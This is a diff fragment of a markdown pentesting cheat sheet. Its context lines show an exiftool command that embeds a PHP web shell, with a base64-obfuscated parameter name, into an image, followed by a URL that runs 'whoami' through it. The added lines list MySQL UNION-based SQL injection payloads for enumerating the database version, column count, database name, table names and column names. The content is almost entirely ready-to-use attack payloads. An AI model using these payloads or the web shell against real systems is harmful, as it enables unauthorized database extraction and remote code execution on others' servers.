@@ -768,6 +768,34 @@ exiftool -Comment="<?php $b0=$_GET[base64_decode('b2s=')];if(isset($b0)){echo ba
 https://site.com/upload/ok.jpg.php?ok=whoami
 
 ## SQL Injection
+### SQL Injection - MySQL/MariaDB
+
+-> get version
+```
+-1 union select 1,2,version();#
+```
+	
+-> get number columns
+```
+-1 order by 3;#
+```
+	
+-> get database name
+```
+-1 union select 1,2,database();#
+```
+	
+-> get table name
+```
+-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<database_name>";#
+```
+	
+-> get column name
+``` 
+-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
+```
+	
+
 ### WAF and Filter Bypass
 #### Query default:
 ```
